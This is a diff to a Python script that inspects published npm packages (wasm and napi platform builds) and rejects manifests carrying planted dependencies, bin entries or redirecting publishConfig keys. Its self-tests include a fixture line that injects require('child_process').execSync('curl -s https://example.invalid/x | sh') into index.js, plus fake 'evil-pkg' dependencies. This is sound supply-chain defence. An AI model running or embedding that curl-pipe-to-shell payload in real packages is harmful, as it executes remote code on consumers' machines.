@@ -105,6 +105,19 @@ WASM_FILES = frozenset({
     "qrcode-ai-scanner.js", "qrcode-ai-scanner.d.ts", "qrcode-ai-scanner_bg.wasm",
     "report-types.d.ts",
 })
+# The keys wasm-pack 0.13.1 writes and scripts/patch-wasm-pkg.mjs renames or
+# adds; a wasm package.json may carry no other key. A `dependencies` or a
+# `publishConfig` is planted — nothing here writes one, and some would run or
+# redirect on a consumer's install.
+WASM_MANIFEST_KEYS = frozenset({
+    "name", "type", "collaborators", "description", "version", "license", "repository",
+    "files", "main", "types", "sideEffects", "keywords", "module",
+})
+# What `napi create-npm-dirs` (@napi-rs/cli 3.7.3) picks from the main manifest
+# into each platform package.json besides name/version/main/files/cpu/os/libc;
+# their values are the main manifest's.
+NAPI_CARRIED = ("description", "keywords", "author", "authors", "homepage", "license", "engines", "repository",
+                "bugs")
 
 # Never in a published archive, whatever its kind; matched case-insensitively
 # (Credentials.json leaks as surely as credentials.json). Defence in depth:
@@ -583,6 +596,7 @@ def inspect_npm(host: Host, path: pathlib.Path, notes=()) -> Artifact:
                   f"scripts: {', '.join(sorted(scripts))}" if scripts else "")
     if name == WASM_NAME:
         check_exact_set(art, files, WASM_FILES, "wasm-pack output + patch allowlist")
+        check_wasm_manifest(art, pkg)
         check_equal_file(art, "report-types.d.ts", files.get("report-types.d.ts"), CANON_TYPES)
         dts = files.get("qrcode-ai-scanner.d.ts", b"").decode()
         retyped = all(
@@ -599,9 +613,55 @@ def inspect_npm(host: Host, path: pathlib.Path, notes=()) -> Artifact:
         check_exact_set(art, files, expected, "platform-package set (package.json · README · LICENSE · binary)")
         art.check("os + cpu declared", bool(pkg.get("os")) and bool(pkg.get("cpu")),
                   f"os={pkg.get('os')} cpu={pkg.get('cpu')}")
+        check_platform_manifest(art, pkg)
     else:
         art.check("known package name", False, name)
     return art
+
+
+def check_platform_manifest(art: Artifact, pkg: dict) -> None:
+    """A platform package.json holds only the keys `napi create-npm-dirs` writes,
+    with the values it derives from the main manifest: anything else (a
+    dependencies key, a bin, a publishConfig key beyond registry/access) is
+    planted and would reach a consumer's install."""
+    suffix = str(pkg.get("name", "")).removeprefix(NODE_NAME + "-")
+    main = json.loads((NODE_DIR / "package.json").read_text())
+    binary = f"{main.get('napi', {}).get('binaryName')}.{suffix}.node"
+    parts = suffix.split("-")
+    os_name, cpu = (parts[0] if parts else ""), (parts[1] if len(parts) > 1 else "")
+    abi = parts[2] if len(parts) > 2 else ""
+    carried = [key for key in NAPI_CARRIED if key in main]
+    allowed = {"name", "version", "main", "files", "cpu", "os", *carried}
+    if "publishConfig" in main:
+        allowed.add("publishConfig")
+    if abi in ("gnu", "musl"):
+        allowed.add("libc")
+    extra = sorted(set(pkg) - allowed)
+    art.check("package.json holds only napi create-npm-dirs' keys (no dependencies, bin or key beyond them)",
+              not extra, f"unexpected: {', '.join(extra)}" if extra else "")
+    want = {"name": f"{NODE_NAME}-{suffix}", "version": main.get("version"), "main": binary, "files": [binary],
+            "cpu": [cpu], "os": [os_name], **{key: main[key] for key in carried}}
+    if abi == "gnu":
+        want["libc"] = ["glibc"]
+    elif abi == "musl":
+        want["libc"] = ["musl"]
+    needed = [key for key in ("name", "version", "main", "files", "cpu", "os") if key not in pkg]
+    off = sorted(key for key, value in want.items() if key in pkg and pkg[key] != value)
+    art.check("each generated field is napi create-npm-dirs' value from the main manifest", not needed and not off,
+              "; ".join(filter(None, [f"missing {', '.join(needed)}" if needed else "",
+                                      "; ".join(f"{key}={pkg.get(key)!r} (want {want[key]!r})" for key in off)])))
+    pc = pkg.get("publishConfig")
+    if isinstance(pc, dict):
+        bad = sorted(set(pc) - {"registry", "access"})
+        art.check("publishConfig holds only registry/access (napi create-npm-dirs picks those)", not bad,
+                  f"unexpected publishConfig keys: {', '.join(bad)}" if bad else "")
+
+
+def check_wasm_manifest(art: Artifact, pkg: dict) -> None:
+    """A wasm package.json holds only the keys wasm-pack + patch-wasm-pkg write."""
+    extra = sorted(set(pkg) - WASM_MANIFEST_KEYS)
+    art.check("package.json holds only wasm-pack + patch-wasm-pkg keys (no dependencies or publishConfig)",
+              not extra, f"unexpected: {', '.join(extra)}" if extra else "")
 
 
 def check_pins(art: Artifact, optional: dict, pkg: dict) -> None:
@@ -1608,6 +1668,26 @@ def self_test() -> int:
         judge("platform package + an install script",
               [npm("platform-install", _with_scripts(_npm_platform(version, "linux-x64-gnu"), install="sh x"))],
               FAIL, "install")
+        # A generated manifest carries only its generator's keys: a dependency,
+        # a peerDependency, an optionalDependency or a bin pulls install-time
+        # code without a `scripts` entry; a publishConfig redirects the upload.
+        for field, value in (("dependencies", {"evil-pkg": "1.0.0"}), ("peerDependencies", {"evil-pkg": "*"}),
+                             ("optionalDependencies", {"evil-pkg": "1.0.0"}), ("bin", {"qr": "x.js"})):
+            pf = _npm_platform(version, "linux-x64-gnu")
+            manifest = json.loads(pf["package.json"]) | {field: value}
+            judge(f"platform package + {field}",
+                  [npm(f"plat-{field}", pf | {"package.json": json.dumps(manifest).encode()})], FAIL, field)
+        pf = _npm_platform(version, "linux-x64-gnu")
+        manifest = json.loads(pf["package.json"]) | {"publishConfig": {"tag": "next", "provenance": False}}
+        judge("platform package + publishConfig beyond registry/access",
+              [npm("plat-pc", pf | {"package.json": json.dumps(manifest).encode()})], FAIL, "publishConfig")
+        for field, value in (("dependencies", {"evil-pkg": "1.0.0"}), ("publishConfig", {"tag": "next"})):
+            wf = _npm_wasm(version)
+            manifest = json.loads(wf["package.json"]) | {field: value}
+            judge(f"wasm package + {field}",
+                  [npm(f"wasm-{field}", wf | {"package.json": json.dumps(manifest, indent=2).encode()})],
+                  FAIL, field)
+
         # The JavaScript a consumer runs, and the manifest, are the committed ones.
         evil = b"\nrequire('child_process').execSync('curl -s https://example.invalid/x | sh');\n"
         for name in ("index.js", "native.js"):
